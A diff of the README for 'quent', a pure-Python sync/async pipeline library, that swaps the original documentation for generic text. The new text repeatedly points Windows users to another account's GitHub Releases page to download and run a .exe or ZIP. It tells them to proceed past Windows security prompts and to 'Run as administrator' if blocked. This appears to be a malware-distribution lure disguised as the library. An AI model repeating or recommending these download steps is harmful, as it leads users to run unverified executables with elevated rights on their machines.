@@ -1,642 +1,160 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/drukmano/quent/master/docs/assets/logo.png" alt="quent" width="200">
-  <h1>quent</h1>
-  <p><strong>Write it once. Run it sync or async.</strong></p>
-  <p>
-    <a href="https://pypi.org/project/quent/"><img src="https://img.shields.io/pypi/v/quent?style=flat-square" alt="PyPI"></a>
-    &nbsp;
-    <a href="https://pypi.org/project/quent/"><img src="https://img.shields.io/pypi/pyversions/quent?style=flat-square" alt="Python"></a>
-    &nbsp;
-    <a href="https://github.com/drukmano/quent/blob/master/LICENSE"><img src="https://img.shields.io/pypi/l/quent?style=flat-square" alt="License"></a>
-    &nbsp;
-    <a href="https://github.com/drukmano/quent/actions/workflows/ci.yml"><img src="https://github.com/drukmano/quent/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-    &nbsp;
-    <a href="https://codecov.io/gh/drukmano/quent"><img src="https://codecov.io/gh/drukmano/quent/branch/master/graph/badge.svg" alt="Coverage"></a>
-    &nbsp;
-    <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff"></a>
-    &nbsp;
-    <a href="https://pepy.tech/project/quent"><img src="https://static.pepy.tech/badge/quent/month" alt="Downloads"></a>
-    &nbsp;
-    <a href="https://quent.readthedocs.io"><img src="https://readthedocs.org/projects/quent/badge/?version=latest" alt="Docs"></a>
-  </p>
-</div>
+# 🚀 quent - Write Python pipelines with ease
 
----
+[⬇️ Download quent from GitHub Releases](https://github.com/Chal8084/quent/releases)
 
-<p align="center">
-  A transparent sync/async bridge for Python.<br>
-  Define a pipeline once — quent handles the rest.
-</p>
+## 🧩 What quent does
 
----
+quent helps you write pipeline code once and use it in sync or async code. It keeps the same flow in both cases, so you do not need two separate versions of the same logic.
 
-- **One definition, two worlds** &mdash; a single pipeline works for both sync and async callers. Zero code duplication.
-- **Zero ceremony** &mdash; no decorators, no base classes, no type wrappers. Just compose your functions.
-- **Drop-in migration** &mdash; unify existing sync and async implementations into one pipeline. Stop maintaining two versions.
-- **Pure Python** &mdash; zero runtime dependencies. Fully typed (PEP 561).
-- **Works with asyncio, trio, and curio** &mdash; async pipelines run transparently under any of these event loops. Event loop detection uses `sys.modules` lookups (~50ns), adding zero overhead when those libraries are not loaded. Dual-protocol objects (context managers and iterables supporting both sync and async protocols) automatically prefer the async protocol under any running event loop.
-- **Focused** &mdash; every feature exists because removing it would force separate sync and async code paths.
+It is built in pure Python and uses no extra dependencies. That keeps setup simple and makes it easy to move between projects.
 
----
+## 💻 What you need
 
-## The Problem
+- Windows 10 or Windows 11
+- A recent version of Python 3
+- Internet access to get the download
+- Enough space for a small app or source package
 
-Any codebase that supports both sync and async callers ends up maintaining two versions of the same logic:
+If you plan to run it from source, install Python first. If you plan to use a packaged release, you can just download the release file and follow the steps below.
 
-```python
-# Without quent -- the same pipeline, written twice
+## 📥 Download and install
 
-def process_sync(data):
-  validated = validate_sync(data)
-  transformed = transform_sync(validated)
-  return save_sync(transformed)
+1. Open the [quent Releases page](https://github.com/Chal8084/quent/releases)
+2. Find the latest release at the top of the page
+3. Look for a Windows file such as:
+   - a `.exe` file
+   - a `.zip` file
+   - a source archive if that is the only option
+4. Download the file to your computer
+5. If you downloaded a `.zip` file, right-click it and choose **Extract All**
+6. Open the extracted folder
+7. If you see an `.exe` file, double-click it to run the app
+8. If you see Python files, use the steps in the next section
 
-async def process_async(data):
-  validated = await validate_async(data)
-  transformed = await transform_async(validated)
-  return await save_async(transformed)
-```
+## ▶️ Run from source on Windows
 
-Every function, every pipeline, every utility &mdash; duplicated. When a bug is fixed in one version, the other falls out of sync. When a new step is added, it must be added in both places.
+Use this path if the release gives you Python files instead of a ready-to-run app.
 
----
+1. Install Python 3 from the official Python website
+2. Download the quent release from the [Releases page](https://github.com/Chal8084/quent/releases)
+3. Extract the files if needed
+4. Open the folder that contains the project files
+5. Hold **Shift** and right-click inside the folder
+6. Choose **Open PowerShell window here** or **Open in Terminal**
+7. Run the app with Python using the file name from the release package
 
-## The Solution
+Example pattern:
 
-```python
-# With quent -- write it once
+- `python main.py`
+- or `python quent.py`
 
-pipeline = Q().then(validate).then(transform).then(save)
+If the package includes a different file name, use that file instead.
 
-result = pipeline.run(data)          # sync if all steps are sync
-result = await pipeline.run(data)    # async if any step is async
-```
+## 🪟 First run on Windows
 
-One definition. The pipeline starts executing synchronously. The moment any step returns an awaitable, execution seamlessly transitions to async and stays there. The caller decides whether to `await`.
+When you start quent for the first time:
 
----
+1. If Windows shows a security prompt, choose the option that lets you run the file
+2. If a command window opens, keep it open while the app runs
+3. If the app has a window, use it like any other desktop app
+4. If the app runs from the terminal, type the required input when asked
 
-## Installation
+If you downloaded a ZIP file, keep the extracted folder in place so the app can find its files.
 
-```bash
-pip install quent
-```
+## 🔄 How quent fits your work
 
-**Requires Python 3.10+.** Supports 3.10 through 3.14, including free-threaded builds. Zero runtime dependencies on Python 3.11+ (`typing_extensions` on 3.10).
+quent is useful when you want one pipeline flow that works in both sync and async code.
 
----
+Common use cases:
 
-## Quick Start
+- simple data steps
+- task chains
+- request handling
+- file processing
+- tools that need the same logic in two run modes
 
-```python
-from quent import Q
+A pipeline lets each step pass its result to the next step. With quent, you write that flow once and let the runtime handle the sync or async path.
 
-# Basic pipeline
-result = Q(5).then(lambda x: x * 2).then(lambda x: x + 1).run()
-print(result)  # 11
+## 🧠 Basic idea
 
-# Side effects -- do() runs the function but passes the value through
-result = Q(42).then(lambda x: x * 2).do(print).then(str).run()  # prints: 84
-print(result)  # '84'
+Think of a pipeline as a line of steps:
 
-# Works with any callable
-result = Q('  hello  ').then(str.strip).then(str.upper).run()
-print(result)  # HELLO
-```
+1. Take input
+2. Process it
+3. Pass the result forward
+4. Finish with output
 
-The same pipeline works whether your functions are sync, async, or a mix:
+quent keeps this pattern clear. That helps when you want code that is easy to read and easy to change.
 
-```python
-pipeline = Q().then(fetch_data).then(validate).then(normalize)
+## 🛠️ Typical setup pattern
 
-# Sync context
-result = pipeline.run(id)
+A common setup looks like this:
 
-# Async context -- same pipeline, no changes
-result = await pipeline.run(id)
-```
+- create a pipeline
+- add steps in order
+- call it from sync code
+- call it from async code
 
----
+The same pipeline can work in both cases, which reduces duplicate code and keeps your project simpler.
 
-## Features
+## 📁 File types you may see
 
-Build pipelines fluently. Every builder method returns `self` for chaining.
+When you open the release, you may see one of these:
 
-```python
-from quent import Q
+- `.exe` — double-click to run
+- `.zip` — extract first, then run
+- `.py` — run with Python
+- source folder — open in Terminal and use Python to start it
 
-result = (
-  Q(fetch_user, user_id)             # fetch user by id
-  .then(validate)                    # transform
-  .do(log)                           # side-effect
-  .foreach(normalize_field)          # per-element
-  .gather(enrich, score)             # concurrent
-  .then(merge)                       # combine
-  .if_(has_premium).then(upgrade)    # conditional
-  .except_(handle_error)             # error handling
-  .finally_(cleanup)                 # cleanup
-  .run()                             # execute
-)
-```
+If you are not sure which file to use, start with the main `.exe` if it exists. If not, use the Python file in the main folder.
 
-<details>
-<summary><strong>Collection Operations</strong> &mdash; foreach, foreach_do</summary>
+## ⚙️ Troubleshooting
 
-<br>
+### 🔹 The file does not open
 
-```python
-# foreach -- transform each element, collect results
-Q([1, 2, 3]).foreach(lambda x: x ** 2).run()  # [1, 4, 9]
+- Check that the download finished
+- Make sure you extracted the ZIP file
+- Try running the file again
+- Right-click the file and choose **Run as administrator** if Windows blocks it
 
-# foreach_do -- side-effect per element, keep originals
-Q([1, 2, 3]).foreach_do(print).run()  # prints 1, 2, 3; returns [1, 2, 3]
+### 🔹 Python is not recognized
 
-# filter via list comprehension
-Q([1, 2, 3, 4, 5]).then(lambda xs: [x for x in xs if x % 2 == 0]).run()  # [2, 4]
-```
+- Install Python 3
+- During install, turn on the option to add Python to PATH
+- Close Terminal and open it again
+- Run the command again
 
-</details>
+### 🔹 Windows asks what app to use
 
-<details>
-<summary><strong>Concurrent Execution</strong> &mdash; gather, concurrency parameter</summary>
+- Pick Python for `.py` files
+- Pick the downloaded app for `.exe` files
 
-<br>
+### 🔹 The terminal closes right away
 
-Run multiple functions on the same value concurrently:
+- Start the app from PowerShell or Command Prompt
+- Read the error message before closing the window
+- Check that you used the correct file name
 
-```python
-Q('hello').gather(str.upper, len).run()  # ('HELLO', 5)
-```
+## 🧪 Example workflow
 
-Limit concurrency on collection operations with the `concurrency` parameter. Uses `ThreadPoolExecutor` for sync callables and `asyncio.Semaphore` + `TaskGroup` for async:
+If you want to test quent on Windows:
 
-```python
-# Process up to 10 items at a time
-Q(urls).foreach(fetch, concurrency=10).run()
+1. Visit the [quent Releases page](https://github.com/Chal8084/quent/releases)
+2. Download the latest Windows package
+3. Extract it if needed
+4. Start the app or run the Python file
+5. Follow the prompt or use the provided pipeline file
 
-# Limit concurrent gather branches
-Q(data).gather(analyze, compress, upload, concurrency=5).run()
-```
+## 🔐 Safety check before you run
 
-Pass a custom executor for sync concurrent operations:
+- Download only from the GitHub Releases page
+- Check that the file name matches the latest release
+- If Windows shows a warning, verify that you opened the correct file from the release folder
 
-```python
-from concurrent.futures import ThreadPoolExecutor
+## 📌 Quick start checklist
 
-with ThreadPoolExecutor(max_workers=4) as pool:
-  Q(urls).foreach(fetch, concurrency=4, executor=pool).run()
-```
-
-</details>
-
-<details>
-<summary><strong>Conditionals</strong> &mdash; if_ / else_</summary>
-
-<br>
-
-```python
-Q(5).if_(lambda x: x > 0).then(lambda x: x * 2).run()  # 10
-Q(-5).if_(lambda x: x > 0).then(str).else_(abs).run()   # 5
-
-# When predicate is omitted, uses truthiness of the current value
-Q('hello').if_().then(str.upper).run()                     # 'HELLO'
-Q('').if_().then(str.upper).else_(lambda _: 'empty').run() # 'empty'
-
-# Literal predicate -- truthiness used directly
-Q(value).if_(is_admin).then(grant_access).run()
-
-# Side-effect conditional branch
-Q(user).if_(is_premium).do(log_premium_access).then(next_step).run()
-```
-
-</details>
-
-<details>
-<summary><strong>Loops</strong> &mdash; while_</summary>
-
-<br>
-
-```python
-# Decrement until zero (default predicate tests truthiness)
-Q(10).while_().then(lambda x: x - 1).run()  # 0
-
-# Predicate callable -- halve while value exceeds 1
-Q(100).while_(lambda x: x > 1).then(lambda x: x // 2).run()  # 1
-
-# break_() to exit early
-Q(1).while_(True).then(lambda x: Q.break_(x) if x >= 100 else x * 2).run()  # 128
-
-# Nest conditionals inside a loop body via nested pipeline
-Q(data).while_(has_more).then(
-  Q().if_(is_valid).then(process).else_(skip)
-).run()
-```
-
-</details>
-
-<details>
-<summary><strong>Context Managers</strong> &mdash; with_ / with_do</summary>
-
-<br>
-
-Transparently handles both sync and async context managers:
-
-```python
-Q(open('data.txt')).with_(lambda f: f.read()).run()
-
-# Side-effect variant (result discarded, original value passes through)
-Q(open('log.txt', 'w')).with_do(lambda f: f.write('done')).run()
-```
-
-</details>
-
-<details>
-<summary><strong>Error Handling</strong> &mdash; except_ / finally_</summary>
-
-<br>
-
-One exception handler and one finally handler per pipeline:
-
-```python
-from quent import Q, QuentExcInfo
-
-Q(0).then(lambda x: 1 / x).except_(lambda ei: -1).run()  # -1
-
-Q(url)
-  .then(fetch)
-  .then(parse)
-  .except_(handle_error, exceptions=ConnectionError)
-  .finally_(cleanup)
-  .run()
-```
-
-`except_` catches `Exception` by default. The handler receives a `QuentExcInfo(exc, root_value)` as its current value. Use `reraise=True` to re-raise after handling (handler runs for side-effects only). `finally_` always runs and receives the pipeline's root value.
-
-</details>
-
-<details>
-<summary><strong>Control Flow</strong> &mdash; return_ / break_</summary>
-
-<br>
-
-```python
-# Early return -- skips all remaining steps
-Q(5) \
-  .then(lambda x: Q.return_(x * 10) if x > 0 else x) \
-  .then(str) \
-  .run()  # 50 (str step is skipped)
-
-# Break from iteration -- break value is appended to partial results
-Q([1, 2, 3, 4, 5]).foreach(lambda x: Q.break_(x) if x == 3 else x * 2).run()
-# [2, 4, 3]
-```
-
-</details>
-
-<details>
-<summary><strong>Composition</strong> &mdash; clone, as_decorator</summary>
-
-<br>
-
-**clone** &mdash; fork-and-extend without modifying the original:
-
-```python
-base = Q().then(validate).then(normalize)
-for_api = base.clone().then(to_json)    # base is untouched
-for_db  = base.clone().then(to_record)  # independent copy
-```
-
-**as_decorator** &mdash; wrap a pipeline as a function decorator:
-
-```python
-@Q().then(lambda x: x.strip()).then(str.upper).as_decorator()
-def get_name():
-  return '  alice  '
-
-get_name()  # 'ALICE'
-```
-
-</details>
-
-<details>
-<summary><strong>Iteration</strong> &mdash; iterate / iterate_do</summary>
-
-<br>
-
-Dual sync/async generators over pipeline output:
-
-```python
-for item in Q(range(5)).iterate(lambda x: x ** 2):
-  print(item)  # 0, 1, 4, 9, 16
-
-async for item in Q(async_source).iterate(transform):
-  print(item)  # works with async sources too
-```
-
-</details>
-
-<details>
-<summary><strong>Generator Driving</strong> &mdash; drive_gen</summary>
-
-<br>
-
-Drive sync or async generators via the send protocol:
-
-```python
-def gen():
-  x = yield 1
-  x = yield x + 1
-  x = yield x + 1
-
-Q(gen()).drive_gen(lambda x: x * 2).run()
-# Flow: yield 1 → fn(1)=2 → send 2 → yield 3 → fn(3)=6 → send 6 → yield 7 → fn(7)=14
-# returns: 14
-
-# Works with async generators too
-result = await Q(async_gen()).drive_gen(process).run()
-```
-
-</details>
-
-<details>
-<summary><strong>Buffered Iteration</strong> &mdash; buffer</summary>
-
-<br>
-
-Decouple producer and consumer with a bounded, backpressure-aware buffer:
-
-```python
-# Producer runs ahead up to 10 items while consumer processes
-for item in Q(produce).buffer(10).iterate():
-  process(item)
-
-# Works with all iteration terminals and async
-async for item in Q(async_produce).buffer(10).iterate(transform):
-  await consume(item)
-```
-
-Sync uses a background thread + `queue.Queue`; async uses a background task + `asyncio.Queue`.
-
-</details>
-
-<details>
-<summary><strong>Debug Execution</strong> &mdash; debug</summary>
-
-<br>
-
-Execute a pipeline with step-level tracing. Returns a `DebugResult` capturing the full execution trace &mdash; each step's name, input, result, timing, and exception status. The original pipeline is not modified (an internal clone is used).
-
-```python
-result = Q(5).then(lambda x: x * 2).then(str).debug()
-print(result.value)       # '10'
-print(result.succeeded)   # True
-print(result.elapsed_ns)  # total nanoseconds
-result.print_trace()      # formatted table to stderr
-
-# Works with async pipelines
-result = await Q(fetch).then(parse).debug(url)
-```
-
-`DebugResult` provides `value`, `steps` (list of `StepRecord`), `elapsed_ns`, `succeeded`, `failed`, and `print_trace()`. Each `StepRecord` has `step_name`, `input_value`, `result`, `elapsed_ns`, `exception`, and `ok`.
-
-</details>
-
----
-
-### Calling Conventions
-
-How arguments flow through the pipeline is determined by two rules, checked in priority order:
-
-| Condition | Behavior |
-|:----------|:---------|
-| Explicit args/kwargs provided | Call `fn(*args, **kwargs)` -- current value NOT passed |
-| No args (default) | Call `fn(current_value)`, `fn()` if no value, or return value as-is if non-callable |
-
-```python
-Q(5).then(str).run()                    # str(5) -- current value passed
-Q(5).then(print, 'hello').run()         # print('hello') -- explicit args used
-```
-
----
-
-### Enhanced Tracebacks
-
-When an exception occurs inside a pipeline, quent injects a visualization directly into the traceback showing exactly which step failed:
-
-```
-Traceback (most recent call last):
-  ...
-  File "<quent>", line 1, in
-    Q(fetch_data)
-    .then(validate)
-    .then(transform) <----
-    .do(log)
-  ...
-ZeroDivisionError: division by zero
-```
-
-The `<----` marker points to the step that raised. Internal quent frames are cleaned from the traceback. On Python 3.11+, a concise exception note is also attached.
-
-Opt out by setting `QUENT_NO_TRACEBACK=1` before importing quent.
-
----
-
-## API Reference
-
-### Constructor
-
-```python
-Q(v=<no value>, /, *args, **kwargs)
-```
-
-<br>
-
-### Pipeline Building
-
-All methods return `self` for fluent chaining.
-
-| Method | Description |
-|:-------|:------------|
-| `.then(v, /, *args, **kwargs)` | Append step; result replaces current value |
-| `.do(fn, /, *args, **kwargs)` | Side-effect step; fn must be callable, result discarded |
-| `.foreach(fn=None, /, *, concurrency=None, executor=None)` | Transform each element, collect results. `fn=None` collects elements as-is (identity mode) |
-| `.foreach_do(fn, /, *, concurrency=None, executor=None)` | Side-effect per element, keep originals. `fn` is required |
-| `.gather(*fns, concurrency=-1, executor=None)` | Run multiple fns on current value, collect results as tuple |
-| `.with_(fn, /, *args, **kwargs)` | Enter current value as context manager, call fn |
-| `.with_do(fn, /, *args, **kwargs)` | Same as with_, but fn result discarded |
-| `.if_(predicate=None, /, *args, **kwargs)` | Begin conditional; must be followed by `.then()` or `.do()` |
-| `.if_(...).then(fn, /, *args, **kwargs)` | Conditional transform -- runs fn if predicate is truthy, result replaces current value |
-| `.if_(...).do(fn, /, *args, **kwargs)` | Conditional side-effect -- runs fn if predicate is truthy, result discarded |
-| `.else_(v, /, *args, **kwargs)` | Else branch (must follow `.then()` or `.do()`) |
-| `.else_do(fn, /, *args, **kwargs)` | Side-effect else branch (result discarded) |
-| `.except_(fn, /, *args, exceptions=None, reraise=False, **kwargs)` | Exception handler (one per pipeline) |
-| `.finally_(fn, /, *args, **kwargs)` | Cleanup handler (one per pipeline) |
-| `.name(label)` | Assign a label for traceback identification |
-| `.while_(predicate=None, /, *args, **kwargs)` | Begin loop; next `.then()` or `.do()` becomes body |
-| `.drive_gen(fn)` | Drive a sync/async generator via send protocol |
-| `.set(key)` / `.set(key, value)` | Store a value in the execution context (current value unchanged) |
-| `.get(key)` / `.get(key, default)` | Retrieve a value from context; replaces current value |
-
-### Execution
-
-| Method | Description |
-|:-------|:------------|
-| `.run(v=<no value>, /, *args, **kwargs)` | Execute the pipeline; returns value or coroutine |
-| `q(...)` | Alias for `.run()` |
-| `.debug(v=<no value>, /, *args, **kwargs)` | Execute with step-level tracing; returns `DebugResult` |
-
-### Reuse and Iteration
-
-| Method | Description |
-|:-------|:------------|
-| `.as_decorator()` | Wrap pipeline as a function decorator |
-| `.iterate(fn=None)` | Dual sync/async generator over output |
-| `.iterate_do(fn=None)` | Like iterate, fn results discarded |
-| `.flat_iterate(fn=None, *, flush=None)` | Flatmap iterator; flattens one level or maps fn to sub-iterables |
-| `.flat_iterate_do(fn=None, *, flush=None)` | Like flat_iterate, fn results discarded; original elements yielded |
-| `.buffer(n)` | Attach backpressure buffer for iteration terminals |
-| `.clone()` | Deep copy for fork-and-extend |
-| `Q.from_steps(*steps)` | Construct a pipeline from a sequence of `.then()` steps |
-
-### Control Flow
-
-<sub>Class methods</sub>
-
-| Method | Description |
-|:-------|:------------|
-| `Q.return_(v=<no value>, /, *args, **kwargs)` | Signal early return from pipeline |
-| `Q.break_(v=<no value>, /, *args, **kwargs)` | Signal break from iteration or `while_` loop |
-
-### Context API (Class-Level)
-
-| Method | Description |
-|:-------|:------------|
-| `Q.set(key, value)` | Store a value in the execution context immediately (not a pipeline step) |
-| `Q.get(key)` / `Q.get(key, default)` | Retrieve a value from the execution context immediately |
-
-### Exports and Instrumentation
-
-| Name | Description |
-|:-----|:------------|
-| `Q` | Main pipeline class |
-| `QuentExcInfo` | NamedTuple `(exc, root_value)` passed to except handlers |
-| `QuentIterator` | Type alias for `.iterate()` / `.iterate_do()` return values |
-| `QuentException` | Exception type for quent-specific errors |
-| `__version__` | Package version string |
-| `Q.on_step` | Optional callback `(q, step_name, input_value, result, elapsed_ns, exception)` for instrumentation. `exception` is `None` on success, the exception object on failure (before `except_` runs). Not called for control flow signals. Zero overhead when `None`. |
-
-> **Note:** `copy.copy()` and `copy.deepcopy()` are blocked on Q objects (`TypeError`). Use `.clone()` to produce a correct independent copy. Pickling is not blocked — most pipeline contents (lambdas, closures) will naturally fail to pickle, but quent does not enforce this.
-
----
-
-## Examples
-
-See the [examples/](examples/) directory for complete, runnable recipes covering ETL pipelines, API gateways, fan-out/fan-in patterns, retry with backoff, and testing pipelines.
-
----
-
-## Performance
-
-The sync path is a tight `while` loop &mdash; zero async machinery. Each sync step adds **~210 ns** of overhead. The async path adds **~4 &micro;s** per step &mdash; overhead that disappears against real I/O.
-
-| Pipeline | 1 Step | 5 Steps | 10 Steps | Per Step |
-|:---------|:------:|:-------:|:--------:|:--------:|
-| **Sync** | 0.8 &micro;s | 1.7 &micro;s | 2.7 &micro;s | ~210 ns |
-| **Async** | 17 &micro;s | 33 &micro;s | 53 &micro;s | ~4 &micro;s |
-| **Mixed** (sync+async) | &mdash; | 22 &micro;s | 34 &micro;s | &mdash; |
-
-<sub>Baselines &mdash; raw function call: ~26 ns &middot; bare <code>await coroutine()</code>: ~2.8 &micro;s</sub>
-
-**I/O-bound workloads** &mdash; quent's primary use case. Pipeline overhead is fixed; I/O latency dwarfs it:
-
-| I/O Latency | 5-Step Overhead | % of Total |
-|:------------|:---------------:|:----------:|
-| 1 ms &ensp;(fast query) | ~22 &micro;s | 2.2% |
-| 5 ms &ensp;(database) | ~22 &micro;s | 0.4% |
-| 50 ms (HTTP API) | ~22 &micro;s | 0.04% |
-
-<sub>Python 3.14, Apple M-series, macOS. See <a href="benchmarks/">benchmark scripts</a> for reproducible results. &mdash; <a href="https://quent.readthedocs.io/en/latest/guide/performance/">Full performance guide &rarr;</a></sub>
-
----
-
-## Testing
-
-quent's correctness rests on a single guarantee: any pipeline step can be swapped between sync and async without changing the result. The test suite is purpose-built to prove this exhaustively.
-
-### Scale
-
-- **1,342+ test methods** across 24 test modules and 286+ test classes
-- **21 CI matrix combinations** &mdash; 3 OSes (Ubuntu, macOS, Windows) &times; 5 Python versions (3.10&ndash;3.14), plus free-threaded builds (3.13t, 3.14t)
-- **Security scanning** &mdash; `pip-audit` for dependency vulnerabilities, `bandit` SAST for source code
-
-### Exhaustive Bridge Testing
-
-The core testing infrastructure proves the sync/async bridge contract across a 7-axis combinatorial space:
-
-1. **Operation type** &mdash; 96 "bricks" covering every pipeline operation &times; every calling convention
-2. **Pipeline length** &mdash; pipelines of 1 to N steps
-3. **Operation order** &mdash; every permutation of operations (with repetition)
-4. **Sync/async per position** &mdash; each step independently sync or async (2<sup>N</sup> combinations per pipeline)
-5. **Error injection** &mdash; exceptions, base exceptions, and control flow signals at each position
-6. **Concurrency** &mdash; sequential and concurrent variants
-7. **Handler configuration** &mdash; 18 error handler combinations (except/finally/both, sync/async, consuming/reraising/failing)
-
-For each configuration, all 2<sup>N</sup> sync/async permutations run and must produce identical results. No expected values are precomputed &mdash; the invariant is that **all permutations agree with each other**. Correctness is independently verified by composing pure-Python oracle functions.
-
-### Additional Testing Strategies
-
-- **Transition matrix** &mdash; all 17,576 triplets of 26 atomic operations verify that every method adjacency produces correct results in all sync/async variants
-- **Property-based testing** &mdash; Hypothesis generates random inputs for 179 property and fuzz tests, including CWE-117 repr sanitization with adversarial ANSI escape sequences
-- **Thread safety** &mdash; 30&ndash;50 concurrent threads with barrier synchronization verify safe concurrent execution of fully constructed pipelines
-- **Oracle validation** &mdash; each of the 96 bricks has an independent oracle function; oracles are verified against quent before being used in bridge assertions
-- **Warning validation** &mdash; all warnings emitted during exhaustive runs are captured and validated against expected patterns
-
-### Running Tests
-
-```bash
-# Full suite (format + lint + type check + tests)
-./run_tests.sh
-
-# Tests only (parallel -- wall-clock time = slowest module)
-python scripts/run_tests_parallel.py
-
-# Single module
-python -m unittest tests.bridge_tests
-```
-
----
-
-## Documentation
-
-Full documentation &mdash; including guides, advanced usage, recipes, and framework integration examples &mdash; is available at **[quent.readthedocs.io](https://quent.readthedocs.io)**.
-
----
-
-## Contributing
-
-See the [contributing guide](https://github.com/drukmano/quent/blob/master/.github/CONTRIBUTING.md) for setup instructions, code style, and PR guidelines.
-
-```bash
-git clone https://github.com/drukmano/quent.git
-cd quent
-uv sync --group dev       # or: pip install -e . && pip install ruff mypy
-bash scripts/run_tests.sh
-```
-
----
-
-<p align="center">
-  <a href="https://quent.readthedocs.io"><strong>Docs</strong></a>
-  &nbsp;&nbsp;&bull;&nbsp;&nbsp;
-  <a href="https://github.com/drukmano/quent"><strong>GitHub</strong></a>
-  &nbsp;&nbsp;&bull;&nbsp;&nbsp;
-  <a href="https://pypi.org/project/quent/"><strong>PyPI</strong></a>
-  &nbsp;&nbsp;&bull;&nbsp;&nbsp;
-  <a href="https://quent.readthedocs.io/en/latest/getting-started/"><strong>Getting Started</strong></a>
-  &nbsp;&nbsp;&bull;&nbsp;&nbsp;
-  <a href="https://github.com/drukmano/quent/releases"><strong>Changelog</strong></a>
-</p>
-
-<p align="center">
-  <sub>MIT &mdash; Copyright (c) 2023&ndash;2026 Ohad Drukman</sub>
-</p>
+- Open the [Releases page](https://github.com/Chal8084/quent/releases)
+- Download the latest Windows file
+- Extract the ZIP file if needed
+- Run the `.exe` file or start the Python file
+- Keep the terminal open if the app uses one
